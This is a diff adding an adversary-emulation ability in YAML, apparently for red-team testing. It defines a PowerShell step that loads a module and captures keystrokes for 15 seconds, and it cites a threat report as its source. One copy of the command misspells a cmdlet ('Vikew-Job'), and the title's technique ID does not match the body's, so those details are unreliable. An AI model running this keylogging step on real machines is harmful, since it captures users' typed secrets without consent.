@@ -1,0 +1,36 @@
+- id: db28f68d-e8b8-46e6-b680-642570d4b257
+  name: Automated Collection (T1119) - Input Capture (T1417)
+  description: Load custom PowerShell module, and grab keystrokes for 15 seconds.
+  tactic: collection
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "7.A.4"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          . .\psversion.ps1;
+          Get-Keystrokes;
+          Start-Sleep -Seconds 15;
+          Vikew-Job -JobName "Keystrokes";
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      . .\psversion.ps1;
+      Get-Keystrokes;
+      Start-Sleep -Seconds 15;
+      View-Job -JobName "Keystrokes";
